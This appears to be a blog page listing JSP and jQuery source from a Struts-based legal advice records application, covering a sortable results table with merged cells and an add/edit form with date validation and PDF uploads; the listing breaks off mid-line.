class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=&quot;/WEB-INF/struts-bean.tld&quot; prefix=&quot;bean&quot; %&gt;</span><br><span class="line">&lt;%@ taglib uri=&quot;/WEB-INF/struts-logic.tld&quot; prefix=&quot;logic&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;js/jquery.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function init()&#123;&#125;</span><br><span class="line"></span><br><span class="line">function _w_table_rowspan(_w_table_id,_w_table_colnum)&#123;</span><br><span class="line">  _w_table_firsttd = &quot;&quot;;</span><br><span class="line">  _w_table_currenttd = &quot;&quot;;</span><br><span class="line">  _w_table_SpanNum = 0;</span><br><span class="line">  _w_table_Obj = $(_w_table_id + &quot; tr td:nth-child(&quot; + _w_table_colnum + &quot;)&quot;);</span><br><span class="line">  _w_table_Obj.each(function(i)&#123;</span><br><span class="line">     if(i==0)&#123;</span><br><span class="line">         _w_table_firsttd = $(this);</span><br><span class="line">         _w_table_SpanNum = 1;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">         _w_table_currenttd = $(this);</span><br><span class="line">         if(_w_table_firsttd.text()==_w_table_currenttd.text())&#123;</span><br><span class="line">              var firstSection = _w_table_firsttd.parent().find(&#x27;td:eq(4)&#x27;).text();</span><br><span class="line">              var currentSection = _w_table_currenttd.parent().find(&#x27;td:eq(4)&#x27;).text();</span><br><span class="line">              if(firstSection == currentSection)&#123;</span><br><span class="line">               _w_table_SpanNum++;</span><br><span class="line">               _w_table_currenttd.hide(); //remove();</span><br><span class="line">               _w_table_firsttd.attr(&quot;rowSpan&quot;,_w_table_SpanNum);</span><br><span class="line">              &#125;</span><br><span class="line">         &#125;else&#123;</span><br><span class="line">             _w_table_firsttd = $(this);</span><br><span class="line">             _w_table_SpanNum = 1;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var sorting = function(title, order)&#123;</span><br><span class="line">  var position = 0;</span><br><span class="line">  var header = &#x27;&#x27;;</span><br><span class="line">  $(&quot;#result thead th&quot;).each(function(index, dom)&#123;</span><br><span class="line">    if(title == $(dom).attr(&#x27;id&#x27;))&#123;</span><br><span class="line">      position = index;</span><br><span class="line">      header = $(dom).text();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  $(&quot;#result thead th:eq(&quot; + position + &quot;)&quot;).html(&quot;&lt;font color=&#x27;yellow&#x27;&gt;&quot; + header + &quot;&lt;/font&gt;&amp;nbsp;&lt;img src=&#x27;images/arrow_&quot; + order + &quot;.gif&#x27;/&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(function()&#123;</span><br><span class="line">  $(&quot;#result thead th&quot;).each(function()&#123;</span><br><span class="line">    $(this).css(&#123;&quot;cursor&quot;:&quot;pointer&quot;&#125;);</span><br><span class="line">    $(this).click(function()&#123;</span><br><span class="line">      var id = $(this).attr(&#x27;id&#x27;);</span><br><span class="line">      $(&quot;:hidden[name=&#x27;orderBy&#x27;]&quot;).val(id);</span><br><span class="line"></span><br><span class="line">      var form = $(&quot;form[name=&#x27;form1&#x27;]&quot;);</span><br><span class="line">      form.submit();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  var sortBy = &#x27;&lt;bean:write name=&quot;sortBy&quot;/&gt;&#x27;;</span><br><span class="line">  var order = &#x27;&lt;bean:write name=&quot;order&quot;/&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">  sorting(sortBy, order);</span><br><span class="line"></span><br><span class="line">  for(var i = 1; i &lt; 10; i++)&#123;</span><br><span class="line">    _w_table_rowspan(&quot;#result&quot;, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;content_layer&quot; style=&quot;z-index:1&quot;&gt;</span><br><span class="line">  &lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;legalAdvice.do?reqCode=list&quot; class=&quot;form&quot;&gt;</span><br><span class="line">    &lt;p class=&quot;form_text_h&quot; align=&quot;right&quot;&gt;&lt;font size=&quot;1&quot;&gt;AM0101001&lt;/font&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p class=&quot;form_text_h&quot;&gt;View Legal Advice:&lt;/p&gt;</span><br><span class="line">    &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;</span><br><span class="line">        &lt;table id=&quot;result&quot; border=&quot;1&quot;&gt;</span><br><span class="line">          &lt;thead&gt;</span><br><span class="line">          &lt;tr&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;c.chapter&quot;&gt;Chapter&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;o.sect_reg&quot;&gt;Section/Regulation&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;o.description&quot;&gt;Description of Offence&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;cla.file_no&quot;&gt;File No.&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;cla.subject&quot;&gt;Subject&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;cla.legal_advice_date&quot;&gt;Legal Advice Date&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;cla.legal_advice_status&quot;&gt;Legal Advice&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;cla.defendant&quot;&gt;Defendant&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;cla.auth_ref_ind&quot;&gt;Authority Reference&lt;/th&gt;</span><br><span class="line">            &lt;th class=&quot;formheader&quot; id=&quot;u.file_name&quot;&gt;File Name&lt;/th&gt;</span><br><span class="line">          &lt;/tr&gt;</span><br><span class="line">          &lt;/thead&gt;</span><br><span class="line">          &lt;tbody&gt;</span><br><span class="line">          &lt;logic:iterate id=&quot;view&quot; name=&quot;list&quot; type=&quot;vo.EnactmentView&quot; scope=&quot;request&quot;&gt;</span><br><span class="line">          &lt;bean:define id=&quot;enactment&quot; name=&quot;view&quot; property=&quot;enactment&quot; type=&quot;vo.Enactment&quot;/&gt;</span><br><span class="line">          &lt;bean:define id=&quot;chapter&quot; name=&quot;view&quot; property=&quot;chapter&quot; type=&quot;vo.Chapter&quot;/&gt;</span><br><span class="line">          &lt;bean:define id=&quot;offenseQuote&quot; name=&quot;view&quot; property=&quot;offenseQuote&quot; type=&quot;vo.OffenseQuote&quot;/&gt;</span><br><span class="line">          &lt;bean:define id=&quot;legalAdviceUpload&quot; name=&quot;view&quot; property=&quot;legalAdviceUpload&quot; type=&quot;vo.LegalAdviceUpload&quot;/&gt;</span><br><span class="line">          &lt;bean:define id=&quot;caseLegalAdvice&quot; name=&quot;view&quot; property=&quot;caseLegalAdvice&quot; type=&quot;vo.CaseLegalAdvice&quot;/&gt;</span><br><span class="line">         </span><br><span class="line">          &lt;tr&gt;</span><br><span class="line">            &lt;td nowrap=&quot;nowrap&quot;&gt;Cap.&lt;bean:write name=&quot;enactment&quot; property=&quot;enactChap&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;offenseQuote&quot; property=&quot;sectReg&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;offenseQuote&quot; property=&quot;description&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;fileNo&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">            &lt;logic:equal name=&quot;caseLegalAdvice&quot; property=&quot;subject&quot; value=&quot;Nil&quot;&gt;</span><br><span class="line">              &lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;subject&quot;/&gt;</span><br><span class="line">            &lt;/logic:equal&gt;</span><br><span class="line">            &lt;logic:notEqual name=&quot;caseLegalAdvice&quot; property=&quot;subject&quot; value=&quot;Nil&quot;&gt;</span><br><span class="line">              &lt;a href=&#x27;legalAdvice.do?reqCode=view&amp;caseSeqNo=&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;caseSeqNo&quot;/&gt;&#x27;&gt;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;subject&quot;/&gt;&lt;/a&gt;</span><br><span class="line">            &lt;/logic:notEqual&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;legalAdviceDateFormat&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;legalAdviceStatus&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;defendant&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;authRefInd&quot;/&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a target=&#x27;_blank&#x27; href=&#x27;legalAdvice.do?reqCode=download&amp;id=&lt;bean:write name=&quot;legalAdviceUpload&quot; property=&quot;uploadSeqNo&quot;/&gt;&#x27;&gt;&lt;bean:write name=&quot;legalAdviceUpload&quot; property=&quot;fileName&quot;/&gt;&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">          &lt;/tr&gt;</span><br><span class="line">          &lt;/logic:iterate&gt;</span><br><span class="line">          &lt;/tbody&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;orderBy&quot; value=&quot;&quot;/&gt;</span><br><span class="line">    &lt;button onclick=&quot;addProsecution()&quot;&gt;Legal Advice Update&lt;/button&gt;</span><br><span class="line">  &lt;/form&gt;</span><br></pre></td></tr></table></figure>
<h1 id="add-jsp-leave-year-checking-with-JS-form-upload"><a href="#add-jsp-leave-year-checking-with-JS-form-upload" class="headerlink" title="add.jsp (leave year checking with JS, form upload)"></a>add.jsp (leave year checking with JS, form upload)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;vo.*, java.text.SimpleDateFormat&quot;%&gt;</span><br><span class="line">&lt;%@ taglib uri=&quot;/WEB-INF/struts-bean.tld&quot; prefix=&quot;bean&quot; %&gt;</span><br><span class="line">&lt;%@ taglib uri=&quot;/WEB-INF/struts-logic.tld&quot; prefix=&quot;logic&quot; %&gt;</span><br><span class="line">&lt;bean:define id=&quot;caseLegalAdvice&quot; name=&quot;caseLegalAdvice&quot; scope=&quot;request&quot; type=&quot;vo.CaseLegalAdvice&quot;/&gt;</span><br><span class="line">&lt;bean:define id=&quot;reqCode&quot; name=&quot;reqCode&quot; scope=&quot;request&quot; type=&quot;java.lang.String&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;js/jquery.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function init()&#123;&#125;</span><br><span class="line"></span><br><span class="line">function calDays(year,month)&#123;</span><br><span class="line">  var days=0;</span><br><span class="line">  switch(month)&#123;</span><br><span class="line">    case 1: case 3: case 5: case 7: case 8: case 10: case 12: days=31;break;</span><br><span class="line">    case 4: case 6: case 9: case 11: days=30;break;</span><br><span class="line">    case 2: if(isLeapYear(year)) days=29;</span><br><span class="line">    else days=28;</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">  return days;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isLeapYear(year)&#123;</span><br><span class="line">  if((year %4==0 &amp;&amp; year %100!=0) || (year %400==0)) return true;</span><br><span class="line">  else return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function checkFiles()&#123;</span><br><span class="line">    var exist = false;</span><br><span class="line">    $(&quot;input[type=&#x27;file&#x27;]&quot;).each(function()&#123;</span><br><span class="line">        if($(this).val() != &#x27;&#x27;)&#123;</span><br><span class="line">          exist = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    if(!exist)&#123;</span><br><span class="line">      alert(&#x27;No file selected.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(function()&#123;</span><br><span class="line">  $(&quot;form[name=&#x27;form1&#x27;]&quot;).submit(function()&#123;</span><br><span class="line">    var regexp = /^(\d&#123;2&#125;)\/(\d&#123;2&#125;)\/(\d&#123;4&#125;)$/;</span><br><span class="line"></span><br><span class="line">    if($(&quot;input[name=&#x27;fileNo&#x27;]&quot;).val() == &#x27;&#x27;)&#123;</span><br><span class="line">      alert(&#x27;File No. is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if($(&quot;input[name=&#x27;subject&#x27;]&quot;).val() == &#x27;&#x27;)&#123;</span><br><span class="line">      alert(&#x27;Subject is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var legalAdviceDate = $(&quot;input[name=&#x27;legalAdviceDate&#x27;]&quot;).val();</span><br><span class="line">    if(legalAdviceDate == &#x27;&#x27;)&#123;</span><br><span class="line">      alert(&#x27;Legal Advice Date is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!regexp.test(legalAdviceDate))&#123;</span><br><span class="line">      alert(&#x27;Legal Advice Date is invalid.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      var match = regexp.exec(legalAdviceDate);</span><br><span class="line">      var year = parseInt(match[3], 10);</span><br><span class="line">      var month = parseInt(match[2], 10);</span><br><span class="line">      var day = parseInt(match[1], 10);</span><br><span class="line">      var maxDay = calDays(year, month);</span><br><span class="line">      if(day &gt; maxDay)&#123;</span><br><span class="line">        alert(&#x27;Legal Advice Date is invalid.&#x27;);</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($(&quot;#ordinance&quot;).val()==null)&#123;</span><br><span class="line">      alert(&#x27;Related Ordinance is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var checked = false;</span><br><span class="line">    $(&quot;:radio[name=&#x27;legalAdviceStatus&#x27;]&quot;).each(function()&#123;</span><br><span class="line">      if($(this).attr(&#x27;checked&#x27;))&#123;</span><br><span class="line">        checked = true;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    if(!checked)&#123;</span><br><span class="line">      alert(&#x27;Legal Advice is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    checked = false;</span><br><span class="line">    $(&quot;:checkbox[name^=&#x27;defendant&#x27;]&quot;).each(function()&#123;</span><br><span class="line">      if($(this).attr(&#x27;checked&#x27;))&#123;</span><br><span class="line">        checked = true;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    if(!checked)&#123;</span><br><span class="line">      alert(&#x27;Defendant is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    checked = false;</span><br><span class="line">    $(&quot;:radio[name=&#x27;authRefInd&#x27;]&quot;).each(function()&#123;</span><br><span class="line">      if($(this).attr(&#x27;checked&#x27;))&#123;</span><br><span class="line">        checked = true;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    if(!checked)&#123;</span><br><span class="line">      alert(&#x27;Any Authority Reference Mentioned is empty.&#x27;);</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(&#x27;&lt;%=reqCode%&gt;&#x27; == &#x27;edit&#x27;)&#123;</span><br><span class="line">      if($(&quot;.deleteFile&quot;).length &lt; 1)&#123;</span><br><span class="line">        if(!checkFiles())&#123;</span><br><span class="line">          return false;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      if(!checkFiles())&#123;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var filesNo = &#x27;&#x27;;</span><br><span class="line">    $(&quot;.uploadFiles&quot;).each(function()&#123;</span><br><span class="line">      filesNo += $(this).find(&#x27;span&#x27;).text() + &quot;|&quot; ;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(&quot;:hidden[name=&#x27;keepFileNos&#x27;]&quot;).val(filesNo);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  $(&quot;.deleteFile&quot;).click(function()&#123;</span><br><span class="line">    $(this).parent().remove();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  var fileName = 3;</span><br><span class="line">  $(&quot;#addFile&quot;).click(function()&#123;</span><br><span class="line">    $(&quot;#files&quot;).append(&quot;&lt;input type=&#x27;file&#x27; accept=&#x27;application/pdf&#x27; name=&#x27;file&quot; + fileName + &quot;&#x27; size=&#x27;40&#x27; /&gt;&lt;br/&gt;&quot;);</span><br><span class="line">    fileName++;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;content_layer&quot; style=&quot;z-index:1&quot;&gt;</span><br><span class="line">  &lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;legalAdvice.do?reqCode=save&quot; class=&quot;form&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;p class=&quot;form_text_h&quot; align=&quot;right&quot;&gt;&lt;font size=&quot;1&quot;&gt;XXXX&lt;/font&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p class=&quot;form_text_h&quot;&gt;Legal Advice Update:&lt;/p&gt;</span><br><span class="line">    &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td class=&quot;formheader&quot; width=&quot;560&quot;&gt;Legal Advice:&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td valign=&quot;top&quot; width=&quot;560&quot;&gt;</span><br><span class="line">          &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;2&quot; cellpadding=&quot;0&quot;&gt;                     </span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td width=&quot;35%&quot;&gt;&lt;b&gt;File No.:&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td width=&quot;65%&quot;&gt;</span><br><span class="line">               &lt;input type=&quot;text&quot; name=&quot;fileNo&quot; size=&quot;40&quot; value=&quot;&quot; maxlength=&quot;50&quot; value=&#x27;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;fileNo&quot;/&gt;&#x27;/&gt;</span><br><span class="line">              &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td width=&quot;35%&quot;&gt;&lt;b&gt;Subject:&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td width=&quot;65%&quot;&gt;</span><br><span class="line">               &lt;input type=&quot;text&quot; name=&quot;subject&quot; size=&quot;40&quot; value=&#x27;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;subject&quot;/&gt;&#x27; maxlength=&quot;50&quot; /&gt;</span><br><span class="line">              &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">           </span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td width=&quot;35%&quot;&gt;&lt;b&gt;Legal Advice Date(dd/mm/yyyy):&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td width=&quot;65%&quot;&gt;</span><br><span class="line">               &lt;input type=&quot;text&quot; name=&quot;legalAdviceDate&quot; size=&quot;40&quot; value=&#x27;&lt;bean:write name=&quot;caseLegalAdvice&quot; property=&quot;legalAdviceDate&quot; format=&quot;dd/MM/yyyy&quot;/&gt;&#x27; maxlength=&quot;40&quot; &gt;</span><br><span class="line">              &lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">              &lt;td width=&quot;35%&quot;&gt;&lt;b&gt;Related Ordinance:&lt;span style=&quot;color:red&quot;&gt;*&lt;/span&gt;&lt;/b&gt;&lt;/td&gt;</span><br><span class="line">              &lt;td width=&quot;65%&quot;&gt;</span><br><span class="line">               &lt;select id=&quot;ordinance&quot; name=&quot;ordinance&quot; size=&quot;7&quot; style=&quot;max-width:260px;width:260px&quot;&gt;</span><br><span class="line">                &lt;%</span><br><span class="line">                  List ordinance = (List)request.getAttribute(&quot;ordinance&quot;);</span><br><span class="line">                  String offenseCode = caseLegalAdvice.getOffenseCode();</span><br><span class="line">                  Iterator it = ordinance.iterator();</span><br><span class="line">                  while(it.hasNext())&#123;</span><br><span class="line">                    List items = (List)it.next();</span><br><span class="line">                    if(offenseCode != null &amp;&amp; offenseCode.equals(items.get(0)))&#123;</span><br><span class="line">                      out.print(&quot;&lt;option selected=&#x27;selected&#x27; 